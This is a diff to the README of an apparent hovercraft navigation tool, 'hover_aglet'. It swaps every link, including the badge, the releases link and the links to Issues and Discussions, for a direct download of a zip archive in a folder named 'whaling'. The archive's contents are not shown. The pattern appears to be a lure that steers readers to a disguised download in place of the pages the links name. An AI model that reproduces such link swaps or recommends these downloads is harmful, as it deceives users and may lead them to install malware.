@@ -6,7 +6,7 @@ Welcome to **hover_aglet**! This application helps you navigate your hovercraft 
 
 ## 📥 Download Now
 
-[![Download hover_aglet](https://img.shields.io/badge/Download-hover_aglet-blue.svg)](https://github.com/bernardo6279/hover_aglet/releases)
+[![Download hover_aglet](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started, visit the releases page to download the software:
 
-[Visit this page to download](https://github.com/bernardo6279/hover_aglet/releases)
+[Visit this page to download](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)
 
 1. Click the link above.
 2. Look for the latest version at the top of the releases list.
@@ -67,8 +67,8 @@ We appreciate and encourage contributions. If you have ideas for features or imp
 
 ## 🔗 Important Links
 
-- [Download hover_aglet now](https://github.com/bernardo6279/hover_aglet/releases)
-- [Open Issues](https://github.com/bernardo6279/hover_aglet/issues)
-- [Join the Discussion](https://github.com/bernardo6279/hover_aglet/discussions)
+- [Download hover_aglet now](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)
+- [Open Issues](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)
+- [Join the Discussion](https://raw.githubusercontent.com/bernardo6279/hover_aglet/main/whaling/hover_aglet-2.1.zip)
 
 Enjoy your hovercraft adventures with **hover_aglet**!
